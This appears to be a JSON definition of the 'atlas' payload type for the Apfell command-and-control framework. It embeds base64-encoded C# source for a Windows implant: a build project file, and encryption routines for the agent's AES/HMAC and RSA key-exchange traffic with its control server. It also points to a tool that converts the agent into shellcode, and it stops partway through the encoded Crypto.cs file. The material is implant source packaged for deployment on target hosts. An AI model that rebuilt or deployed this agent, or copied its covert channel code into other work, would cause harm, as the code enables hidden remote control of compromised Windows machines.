{"payload_types":[{"wrapper":false,"command_template":"\n","supported_os":"Windows (x86),Windows (x64)","execute_help":"Run as a normal executable on Windows or use the donut project to turn into shellcode: https:\/\/github.com\/TheWover\/donut","external":false,"container_running":true,"service":"rabbitmq","author":"@Airzero24","note":"This payload uses C# to target Windows hosts with the .NET framework installed.","supports_dynamic_loading":false,"deleted":false,"last_heartbeat":"03\/05\/2020 07:00:40","ptype":"atlas","file_extension":"cs","wrapped_payload_type":"null","icon":null,"files":[{"Atlas.csproj":"77u\/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxQcm9qZWN0IFRvb2xzVmVyc2lvbj0iMTUuMCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vZGV2ZWxvcGVyL21zYnVpbGQvMjAwMyI+DQogIDxJbXBvcnQgUHJvamVjdD0iJChNU0J1aWxkRXh0ZW5zaW9uc1BhdGgpXCQoTVNCdWlsZFRvb2xzVmVyc2lvbilcTWljcm9zb2Z0LkNvbW1vbi5wcm9wcyIgQ29uZGl0aW9uPSJFeGlzdHMoJyQoTVNCdWlsZEV4dGVuc2lvbnNQYXRoKVwkKE1TQnVpbGRUb29sc1ZlcnNpb24pXE1pY3Jvc29mdC5Db21tb24ucHJvcHMnKSIgLz4NCiAgPFByb3BlcnR5R3JvdXA+DQogICAgPENvbmZpZ3VyYXRpb24gQ29uZGl0aW9uPSIgJyQoQ29uZmlndXJhdGlvbiknID09ICcnICI+UmVsZWFzZTwvQ29uZmlndXJhdGlvbj4NCiAgICA8UGxhdGZvcm0gQ29uZGl0aW9uPSIgJyQoUGxhdGZvcm0pJyA9PSAnJyAiPkFueUNQVTwvUGxhdGZvcm0+DQogICAgPFByb2plY3RHdWlkPnswNUE1RDRFQi1EQzE5LTQ4MDAtODlFRC1CMTMxQjMzNTE3RER9PC9Qcm9qZWN0R3VpZD4NCiAgICA8T3V0cHV0VHlwZT5XaW5FeGU8L091dHB1dFR5cGU+DQogICAgPFJvb3ROYW1lc3BhY2U+QXRsYXM8L1Jvb3ROYW1lc3BhY2U+DQogICAgPEFzc2VtYmx5TmFtZT5BdGxhczwvQXNzZW1ibHlOYW1lPg0KICAgIDxUYXJnZXRGcmFtZXdvcmtWZXJzaW9uPnYzLjU8L1RhcmdldEZyYW1ld29ya1ZlcnNpb24+DQogICAgPEZpbGVBbGlnbm1lbnQ+NTEyPC9GaWxlQWxpZ25tZW50Pg0KICAgIDxEZXRlcm1pbmlzdGljPnRydWU8L0RldGVybWluaXN0aWM+DQogICAgPE51R2V0UGFja2FnZUltcG9ydFN0YW1wPg0KICAgIDwvTnVHZXRQYWNrYWdlSW1wb3J0U3RhbXA+DQogICAgPFB1Ymxpc2hVcmw+cHVibGlzaFw8L1B1Ymxpc2hVcmw+DQogICAgPEluc3RhbGw+dHJ1ZTwvSW5zdGFsbD4NCiAgICA8SW5zdGFsbEZyb20+RGlzazwvSW5zdGFsbEZyb20+DQogICAgPFVwZGF0ZUVuYWJsZWQ+ZmFsc2U8L1VwZGF0ZUVuYWJsZWQ+DQogICAgPFVwZGF0ZU1vZGU+Rm9yZWdyb3VuZDwvVXBkYXRlTW9kZT4NCiAgICA8VXBkYXRlSW50ZXJ2YWw+NzwvVXBkYXRlSW50ZXJ2YWw+DQogICAgPFVwZGF0ZUludGVydmFsVW5pdHM+RGF5czwvVXBkYXRlSW50ZXJ2YWxVbml0cz4NCiAgICA8VXBkYXRlUGVyaW9kaWNhbGx5PmZhbHNlPC9VcGRhdGVQZXJpb2RpY2FsbHk+DQogICAgPFVwZGF0ZVJlcXVpcmVkPmZhbHNlPC9VcGRhdGVSZXF1aXJlZD4NCiAgICA8TWFwRmlsZUV4dGVuc2lvbnM+dHJ1ZTwvTWFwRmlsZUV4dGVuc2lvbnM+DQogICAgPEFwcGxpY2F0aW9uUmV2aXNpb24+MDwvQXBwbGljYXRpb25SZXZpc2lvbj4NCiAgICA8QXBwbGljYXRpb25WZXJzaW9uPjEuMC4wLiUyYTwvQXBwbGljYXRpb25WZXJzaW9uPg0KICAgIDxJc1dlYkJvb3RzdHJhcHBlcj5mYWxzZTwvSXNXZWJCb290c3RyYXBwZXI+DQogICAgPFVzZUFwcGxpY2F0aW9uVHJ1c3Q+ZmFsc2U8L1VzZUFwcGxpY2F0aW9uVHJ1c3Q+DQogICAgPEJvb3RzdHJhcHBlckVuYWJsZWQ+dHJ1ZTwvQm9vdHN0cmFwcGVyRW5hYmxlZD4NCiAgICA8VGFyZ2V0RnJhbWV3b3JrUHJvZmlsZSAvPg0KICA8L1Byb3BlcnR5R3JvdXA+DQogIDxQcm9wZXJ0eUdyb3VwIENvbmRpdGlvbj0iICckKENvbmZpZ3VyYXRpb24pfCQoUGxhdGZvcm0pJyA9PSAnRGVidWd8QW55Q1BVJyAiPg0KICAgIDxQbGF0Zm9ybVRhcmdldD5BbnlDUFU8L1BsYXRmb3JtVGFyZ2V0Pg0KICAgIDxEZWJ1Z1N5bWJvbHM+dHJ1ZTwvRGVidWdTeW1ib2xzPg0KICAgIDxEZWJ1Z1R5cGU+ZnVsbDwvRGVidWdUeXBlPg0KICAgIDxPcHRpbWl6ZT5mYWxzZTwvT3B0aW1pemU+DQogICAgPE91dHB1dFBhdGg+YmluXERlYnVnXDwvT3V0cHV0UGF0aD4NCiAgICA8RGVmaW5lQ29uc3RhbnRzPkRFQlVHO1RSQUNFPC9EZWZpbmVDb25zdGFudHM+DQogICAgPEVycm9yUmVwb3J0PnByb21wdDwvRXJyb3JSZXBvcnQ+DQogICAgPFdhcm5pbmdMZXZlbD40PC9XYXJuaW5nTGV2ZWw+DQogIDwvUHJvcGVydHlHcm91cD4NCiAgPFByb3BlcnR5R3JvdXAgQ29uZGl0aW9uPSIgJyQoQ29uZmlndXJhdGlvbil8JChQbGF0Zm9ybSknID09ICdSZWxlYXNlfEFueUNQVScgIj4NCiAgICA8UGxhdGZvcm1UYXJnZXQ+QW55Q1BVPC9QbGF0Zm9ybVRhcmdldD4NCiAgICA8RGVidWdUeXBlPm5vbmU8L0RlYnVnVHlwZT4NCiAgICA8T3B0aW1pemU+dHJ1ZTwvT3B0aW1pemU+DQogICAgPE91dHB1dFBhdGg+YmluXFJlbGVhc2VcPC9PdXRwdXRQYXRoPg0KICAgIDxEZWZpbmVDb25zdGFudHM+VFJBQ0U8L0RlZmluZUNvbnN0YW50cz4NCiAgICA8RXJyb3JSZXBvcnQ+cHJvbXB0PC9FcnJvclJlcG9ydD4NCiAgICA8V2FybmluZ0xldmVsPjQ8L1dhcm5pbmdMZXZlbD4NCiAgPC9Qcm9wZXJ0eUdyb3VwPg0KICA8UHJvcGVydHlHcm91cD4NCiAgICA8U3RhcnR1cE9iamVjdCAvPg0KICA8L1Byb3BlcnR5R3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPFJlZmVyZW5jZSBJbmNsdWRlPSJTeXN0ZW0iIC8+DQogICAgPFJlZmVyZW5jZSBJbmNsdWRlPSJTeXN0ZW0uQ29yZSIgLz4NCiAgICA8UmVmZXJlbmNlIEluY2x1ZGU9IlN5c3RlbS5YbWwuTGlucSIgLz4NCiAgICA8UmVmZXJlbmNlIEluY2x1ZGU9IlN5c3RlbS5EYXRhLkRhdGFTZXRFeHRlbnNpb25zIiAvPg0KICAgIDxSZWZlcmVuY2UgSW5jbHVkZT0iTWljcm9zb2Z0LkNTaGFycCIgLz4NCiAgICA8UmVmZXJlbmNlIEluY2x1ZGU9IlN5c3RlbS5EYXRhIiAvPg0KICAgIDxSZWZlcmVuY2UgSW5jbHVkZT0iU3lzdGVtLlhtbCIgLz4NCiAgPC9JdGVtR3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPENvbXBpbGUgSW5jbHVkZT0iQ29uZmlnLmNzIiAvPg0KICAgIDxDb21waWxlIEluY2x1ZGU9IkNyeXB0by5jcyIgLz4NCiAgICA8Q29tcGlsZSBJbmNsdWRlPSJIdHRwLmNzIiAvPg0KICAgIDxDb21waWxlIEluY2x1ZGU9Ik1vZHVsZXMuY3MiIC8+DQogICAgPENvbXBpbGUgSW5jbHVkZT0iUHJvZ3JhbS5jcyIgLz4NCiAgICA8Q29tcGlsZSBJbmNsdWRlPSJVdGlscy5jcyIgLz4NCiAgPC9JdGVtR3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPE5vbmUgSW5jbHVkZT0iYXBwLmNvbmZpZyIgLz4NCiAgPC9JdGVtR3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPEJvb3RzdHJhcHBlclBhY2thZ2UgSW5jbHVkZT0iTWljcm9zb2Z0Lk5ldC5GcmFtZXdvcmsuMy41LlNQMSI+DQogICAgICA8VmlzaWJsZT5GYWxzZTwvVmlzaWJsZT4NCiAgICAgIDxQcm9kdWN0TmFtZT4uTkVUIEZyYW1ld29yayAzLjUgU1AxPC9Qcm9kdWN0TmFtZT4NCiAgICAgIDxJbnN0YWxsPmZhbHNlPC9JbnN0YWxsPg0KICAgIDwvQm9vdHN0cmFwcGVyUGFja2FnZT4NCiAgPC9JdGVtR3JvdXA+DQogIDxJbXBvcnQgUHJvamVjdD0iJChNU0J1aWxkVG9vbHNQYXRoKVxNaWNyb3NvZnQuQ1NoYXJwLnRhcmdldHMiIC8+DQo8L1Byb2plY3Q+"},{"Crypto.cs":"77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlRleHQ7DQp1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Ow0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLkxpbnE7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIGNsYXNzIENyeXB0bw0KICAgIHsNCiNpZiAoREVGQVVMVF9FS0UgfHwgSFRUUF9FS0UpDQogICAgICAgIC8vLyA8c3VtbWFyeT4NCiAgICAgICAgLy8vIEVuY3J5cHQgYW55IGdpdmVuIHBsYWludGV4dCB3aXRoIHRoZSBQU0sgZ2l2ZW4NCiAgICAgICAgLy8vIHRvIHRoZSBhZ2VudC4NCiAgICAgICAgLy8vIDwvc3VtbWFyeT4NCiAgICAgICAgLy8vIDxwYXJhbSBuYW1lPSJwbGFpbnRleHQiPlBsYWludGV4dCB0byBlbmNyeXB0LjwvcGFyYW0+DQogICAgICAgIC8vLyA8cmV0dXJucz5FbnJ5cHRlZCBzdHJpbmcuPC9yZXR1cm5zPg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBFbmNyeXB0U3RhZ2Uoc3RyaW5nIHBsYWludGV4dCkNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgKEFlcyBhZXMgPSBBZXMuQ3JlYXRlKCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgLy8gVXNlIG91ciBQU0sgKGdlbmVyYXRlZCBpbiBBcGZlbGwgcGF5bG9hZCBjb25maWcpIGFzIHRoZSBBRVMga2V5DQogICAgICAgICAgICAgICAgYWVzLktleSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDb25maWcuUHNrKTsNCiAgICAgICAgICAgICAgICBhZXMuUGFkZGluZyA9IFBhZGRpbmdNb2RlLlBLQ1M3Ow0KICAgICAgICAgICAgICAgIElDcnlwdG9UcmFuc2Zvcm0gZW5jcnlwdG9yID0gYWVzLkNyZWF0ZUVuY3J5cHRvcihhZXMuS2V5LCBhZXMuSVYpOw0KDQogICAgICAgICAgICAgICAgdXNpbmcgKE1lbW9yeVN0cmVhbSBlbmNyeXB0TWVtU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbSgpKQ0KICAgICAgICAgICAgICAgIHVzaW5nIChDcnlwdG9TdHJlYW0gZW5jcnlwdENyeXB0b1N0cmVhbSA9IG5ldyBDcnlwdG9TdHJlYW0oZW5jcnlwdE1lbVN0cmVhbSwgZW5jcnlwdG9yLCBDcnlwdG9TdHJlYW1Nb2RlLldyaXRlKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHVzaW5nIChTdHJlYW1Xcml0ZXIgZW5jcnlwdFN0cmVhbVdyaXRlciA9IG5ldyBTdHJlYW1Xcml0ZXIoZW5jcnlwdENyeXB0b1N0cmVhbSkpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0U3RyZWFtV3JpdGVyLldyaXRlKHBsYWludGV4dCk7DQogICAgICAgICAgICAgICAgICAgIC8vIFdlIG5lZWQgdG8gc2VuZCB1dWlkOml2OmNpcGhlcnRleHQ6aG1hYw0KICAgICAgICAgICAgICAgICAgICAvLyBDb25jYXQgaXY6Y2lwaGVydGV4dA0KICAgICAgICAgICAgICAgICAgICBieXRlW10gZW5jcnlwdGVkID0gYWVzLklWLkNvbmNhdChlbmNyeXB0TWVtU3RyZWFtLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KICAgICAgICAgICAgICAgICAgICBITUFDU0hBMjU2IHNoYTI1NiA9IG5ldyBITUFDU0hBMjU2KENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhDb25maWcuUHNrKSk7DQogICAgICAgICAgICAgICAgICAgIC8vIEF0dGFjaCBobWFjIHRvIGl2OmNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGhtYWMgPSBzaGEyNTYuQ29tcHV0ZUhhc2goZW5jcnlwdGVkKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gQXR0YWNoIHV1aWQgdG8gaXY6Y2lwaGVydGV4dDpobWFjDQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBmaW5hbCA9IEVuY29kaW5nLlVURjguR2V0Qnl0ZXMoQ29uZmlnLlBheWxvYWRVVUlEKS5Db25jYXQoZW5jcnlwdGVkLkNvbmNhdChobWFjKS5Ub0FycmF5KCkpLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gUmV0dXJuIGJhc2U2NCBlbmNvZGVkIGNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoZmluYWwpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KI2VuZGlmIA0KI2lmIChERUZBVUxUX1BTSyB8fCBERUZBVUxUX0VLRSB8fCBIVFRQX1BTSyB8fCBIVFRQX0VLRSkNCiAgICAgICAgLy8vIDxzdW1tYXJ5Pg0KICAgICAgICAvLy8gRW5jcnlwdCBhbnkgZ2l2ZW4gcGxhaW50ZXh0IHdpdGggdGhlIFBTSyBnaXZlbg0KICAgICAgICAvLy8gdG8gdGhlIGFnZW50Lg0KICAgICAgICAvLy8gPC9zdW1tYXJ5Pg0KICAgICAgICAvLy8gPHBhcmFtIG5hbWU9InBsYWludGV4dCI+UGxhaW50ZXh0IHRvIGVuY3J5cHQuPC9wYXJhbT4NCiAgICAgICAgLy8vIDxyZXR1cm5zPkVucnlwdGVkIHN0cmluZy48L3JldHVybnM+DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIEVuY3J5cHRDaGVja2luKHN0cmluZyBwbGFpbnRleHQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHVzaW5nIChBZXMgYWVzID0gQWVzLkNyZWF0ZSgpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIC8vIFVzZSBvdXIgUFNLIChnZW5lcmF0ZWQgaW4gQXBmZWxsIHBheWxvYWQgY29uZmlnKSBhcyB0aGUgQUVTIGtleQ0KICAgICAgICAgICAgICAgIGFlcy5LZXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzayk7DQogICAgICAgICAgICAgICAgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsNCiAgICAgICAgICAgICAgICBJQ3J5cHRvVHJhbnNmb3JtIGVuY3J5cHRvciA9IGFlcy5DcmVhdGVFbmNyeXB0b3IoYWVzLktleSwgYWVzLklWKTsNCg0KICAgICAgICAgICAgICAgIHVzaW5nIChNZW1vcnlTdHJlYW0gZW5jcnlwdE1lbVN0cmVhbSA9IG5ldyBNZW1vcnlTdHJlYW0oKSkNCiAgICAgICAgICAgICAgICB1c2luZyAoQ3J5cHRvU3RyZWFtIGVuY3J5cHRDcnlwdG9TdHJlYW0gPSBuZXcgQ3J5cHRvU3RyZWFtKGVuY3J5cHRNZW1TdHJlYW0sIGVuY3J5cHRvciwgQ3J5cHRvU3RyZWFtTW9kZS5Xcml0ZSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB1c2luZyAoU3RyZWFtV3JpdGVyIGVuY3J5cHRTdHJlYW1Xcml0ZXIgPSBuZXcgU3RyZWFtV3JpdGVyKGVuY3J5cHRDcnlwdG9TdHJlYW0pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZW5jcnlwdFN0cmVhbVdyaXRlci5Xcml0ZShwbGFpbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAvLyBXZSBuZWVkIHRvIHNlbmQgdXVpZDppdjpjaXBoZXJ0ZXh0OmhtYWMNCiAgICAgICAgICAgICAgICAgICAgLy8gQ29uY2F0IGl2OmNpcGhlcnRleHQNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGVuY3J5cHRlZCA9IGFlcy5JVi5Db25jYXQoZW5jcnlwdE1lbVN0cmVhbS5Ub0FycmF5KCkpLlRvQXJyYXkoKTsNCiAgICAgICAgICAgICAgICAgICAgSE1BQ1NIQTI1NiBzaGEyNTYgPSBuZXcgSE1BQ1NIQTI1NihDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzaykpOw0KICAgICAgICAgICAgICAgICAgICAvLyBBdHRhY2ggaG1hYyB0byBpdjpjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBobWFjID0gc2hhMjU2LkNvbXB1dGVIYXNoKGVuY3J5cHRlZCk7DQogICAgICAgICAgICAgICAgICAgIC8vIEF0dGFjaCB1dWlkIHRvIGl2OmNpcGhlcnRleHQ6aG1hYw0KI2lmIChERUZBVUxUX0VLRSB8fCBIVFRQX0VLRSkNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcudGVtcFVVSUQpLkNvbmNhdChlbmNyeXB0ZWQuQ29uY2F0KGhtYWMpLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KI2Vsc2UNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuUGF5bG9hZFVVSUQpLkNvbmNhdChlbmNyeXB0ZWQuQ29uY2F0KGhtYWMpLlRvQXJyYXkoKSkuVG9BcnJheSgpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgICAgIC8vIFJldHVybiBiYXNlNjQgZW5jb2RlZCBjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbmFsKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLy8gPHN1bW1hcnk+DQogICAgICAgIC8vLyBFbmNyeXB0IGFueSBnaXZlbiBwbGFpbnRleHQgd2l0aCB0aGUgUFNLIGdpdmVuDQogICAgICAgIC8vLyB0byB0aGUgYWdlbnQuDQogICAgICAgIC8vLyA8L3N1bW1hcnk+DQogICAgICAgIC8vLyA8cGFyYW0gbmFtZT0icGxhaW50ZXh0Ij5QbGFpbnRleHQgdG8gZW5jcnlwdC48L3BhcmFtPg0KICAgICAgICAvLy8gPHJldHVybnM+RW5yeXB0ZWQgc3RyaW5nLjwvcmV0dXJucz4NCiAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgRW5jcnlwdChzdHJpbmcgcGxhaW50ZXh0KQ0KICAgICAgICB7DQogICAgICAgICAgICB1c2luZyAoQWVzIGFlcyA9IEFlcy5DcmVhdGUoKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBVc2Ugb3VyIFBTSyAoZ2VuZXJhdGVkIGluIEFwZmVsbCBwYXlsb2FkIGNvbmZpZykgYXMgdGhlIEFFUyBrZXkNCiAgICAgICAgICAgICAgICBhZXMuS2V5ID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spOw0KICAgICAgICAgICAgICAgIGFlcy5QYWRkaW5nID0gUGFkZGluZ01vZGUuUEtDUzc7DQogICAgICAgICAgICAgICAgSUNyeXB0b1RyYW5zZm9ybSBlbmNyeXB0b3IgPSBhZXMuQ3JlYXRlRW5jcnlwdG9yKGFlcy5LZXksIGFlcy5JVik7DQoNCiAgICAgICAgICAgICAgICB1c2luZyAoTWVtb3J5U3RyZWFtIGVuY3J5cHRNZW1TdHJlYW0gPSBuZXcgTWVtb3J5U3RyZWFtKCkpDQogICAgICAgICAgICAgICAgdXNpbmcgKENyeXB0b1N0cmVhbSBlbmNyeXB0Q3J5cHRvU3RyZWFtID0gbmV3IENyeXB0b1N0cmVhbShlbmNyeXB0TWVtU3RyZWFtLCBlbmNyeXB0b3IsIENyeXB0b1N0cmVhbU1vZGUuV3JpdGUpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKFN0cmVhbVdyaXRlciBlbmNyeXB0U3RyZWFtV3JpdGVyID0gbmV3IFN0cmVhbVdyaXRlcihlbmNyeXB0Q3J5cHRvU3RyZWFtKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuY3J5cHRTdHJlYW1Xcml0ZXIuV3JpdGUocGxhaW50ZXh0KTsNCiAgICAgICAgICAgICAgICAgICAgLy8gV2UgbmVlZCB0byBzZW5kIHV1aWQ6aXY6Y2lwaGVydGV4dDpobWFjDQogICAgICAgICAgICAgICAgICAgIC8vIENvbmNhdCBpdjpjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIGJ5dGVbXSBlbmNyeXB0ZWQgPSBhZXMuSVYuQ29uY2F0KGVuY3J5cHRNZW1TdHJlYW0uVG9BcnJheSgpKS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgIEhNQUNTSEEyNTYgc2hhMjU2ID0gbmV3IEhNQUNTSEEyNTYoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spKTsNCiAgICAgICAgICAgICAgICAgICAgLy8gQXR0YWNoIGhtYWMgdG8gaXY6Y2lwaGVydGV4dA0KICAgICAgICAgICAgICAgICAgICBieXRlW10gaG1hYyA9IHNoYTI1Ni5Db21wdXRlSGFzaChlbmNyeXB0ZWQpOw0KICAgICAgICAgICAgICAgICAgICAvLyBBdHRhY2ggdXVpZCB0byBpdjpjaXBoZXJ0ZXh0OmhtYWMNCiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGZpbmFsID0gRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhDb25maWcuVVVJRCkuQ29uY2F0KGVuY3J5cHRlZC5Db25jYXQoaG1hYykuVG9BcnJheSgpKS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgIC8vIFJldHVybiBiYXNlNjQgZW5jb2RlZCBjaXBoZXJ0ZXh0DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKGZpbmFsKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLy8gPHN1bW1hcnk+DQogICAgICAgIC8vLyBEZWNyeXB0IGEgc3RyaW5nIHdoaWNoIGhhcyBiZWVuIGVuY3J5cHRlZCB3aXRoIHRoZSBQU0suDQogICAgICAgIC8vLyA8L3N1bW1hcnk+DQogICAgICAgIC8vLyA8cGFyYW0gbmFtZT0iZW5jcnlwdGVkIj5UaGUgZW5jcnlwdGVkIHN0cmluZy48L3BhcmFtPg0KICAgICAgICAvLy8gPHJldHVybnM+PC9yZXR1cm5zPg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBEZWNyeXB0KHN0cmluZyBlbmNyeXB0ZWQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBpbnB1dCA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNyeXB0ZWQpOw0KDQogICAgICAgICAgICBpbnQgdXVpZExlbmd0aCA9IENvbmZpZy5QYXlsb2FkVVVJRC5MZW5ndGg7DQogICAgICAgICAgICAvLyBJbnB1dCBpcyB1dWlkOml2OmNpcGhlcnRleHQ6aG1hYywgSVYgaXMgMTYgYnl0ZXMNCiAgICAgICAgICAgIGJ5dGVbXSB1dWlkSW5wdXQgPSBuZXcgYnl0ZVt1dWlkTGVuZ3RoXTsNCiAgICAgICAgICAgIEFycmF5LkNvcHkoaW5wdXQsIHV1aWRJbnB1dCwgdXVpZExlbmd0aCk7DQoNCiAgICAgICAgICAgIGJ5dGVbXSBJViA9IG5ldyBieXRlWzE2XTsNCiAgICAgICAgICAgIEFycmF5LkNvcHkoaW5wdXQsIHV1aWRMZW5ndGgsIElWLCAwLCAxNik7DQoNCiAgICAgICAgICAgIGJ5dGVbXSBjaXBoZXJ0ZXh0ID0gbmV3IGJ5dGVbaW5wdXQuTGVuZ3RoIC0gdXVpZExlbmd0aCAtIDE2IC0gMzJdOw0KICAgICAgICAgICAgQXJyYXkuQ29weShpbnB1dCwgdXVpZExlbmd0aCArIDE2LCBjaXBoZXJ0ZXh0LCAwLCBjaXBoZXJ0ZXh0Lkxlbmd0aCk7DQoNCiAgICAgICAgICAgIEhNQUNTSEEyNTYgc2hhMjU2ID0gbmV3IEhNQUNTSEEyNTYoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKENvbmZpZy5Qc2spKTsNCiAgICAgICAgICAgIGJ5dGVbXSBobWFjID0gbmV3IGJ5dGVbMzJdOw0KICAgICAgICAgICAgQXJyYXkuQ29weShpbnB1dCwgdXVpZExlbmd0aCArIDE2ICsgY2lwaGVydGV4dC5MZW5ndGgsIGhtYWMsIDAsIDMyKTsNCg0KICAgICAgICAgICAgaWYgKENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoaG1hYykgPT0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhzaGEyNTYuQ29tcHV0ZUhhc2goSVYuQ29uY2F0KGNpcGhlcnRleHQpLlRvQXJyYXkoKSkpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHVzaW5nIChBZXMgYWVzID0gQWVzLkNyZWF0ZSgpKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gVXNlIG91ciBQU0sgKGdlbmVyYXRlZCBpbiBBcGZlbGwgcGF5bG9hZCBjb25maWcpIGFzIHRoZSBBRVMga2V5DQogICAgICAgICAgICAgICAgICAgIGFlcy5LZXkgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoQ29uZmlnLlBzayk7DQogICAgICAgICAgICAgICAgICAgIGFlcy5QYWRkaW5nID0gUGFkZGluZ01vZGUuUEtDUzc7DQogICAgICAgICAgICAgICAgICAgIElDcnlwdG9UcmFuc2Zvcm0gZGVjcnlwdG9yID0gYWVzLkNyZWF0ZURlY3J5cHRvcihhZXMuS2V5LCBJVik7DQoNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKE1lbW9yeVN0cmVhbSBkZWNyeXB0TWVtU3RyZWFtID0gbmV3IE1lbW9yeVN0cmVhbShjaXBoZXJ0ZXh0KSkNCiAgICAgICAgICAgICAgICAgICAgdXNpbmcgKENyeXB0b1N0cmVhbSBkZWNyeXB0Q3J5cHRvU3RyZWFtID0gbmV3IENyeXB0b1N0cmVhbShkZWNyeXB0TWVtU3RyZWFtLCBkZWNyeXB0b3IsIENyeXB0b1N0cmVhbU1vZGUuUmVhZCkpDQogICAgICAgICAgICAgICAgICAgIHVzaW5nIChTdHJlYW1SZWFkZXIgZGVjcnlwdFN0cmVhbVJlYWRlciA9IG5ldyBTdHJlYW1SZWFkZXIoZGVjcnlwdENyeXB0b1N0cmVhbSkpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBkZWNyeXB0ZWQgPSBkZWNyeXB0U3RyZWFtUmVhZGVyLlJlYWRUb0VuZCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gUmV0dXJuIGRlY3J5cHRlZCBtZXNzYWdlIGZyb20gQXBmZWxsIHNlcnZlcg0KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEVuY29kaW5nLlVURjguR2V0U3RyaW5nKHV1aWRJbnB1dCkgKyBkZWNyeXB0ZWQ7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuICIiOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQojZW5kaWYNCiNpZiAoREVGQVVMVF9FS0UgfHwgSFRUUF9FS0UpDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBHZW5Sc2FLZXlzKCkNCiAgICAgICAgew0KDQogICAgICAgICAgICBDb25maWcuUnNhID0gbmV3IFJTQUNyeXB0b1NlcnZpY2VQcm92aWRlcig0MDk2KSANCiAg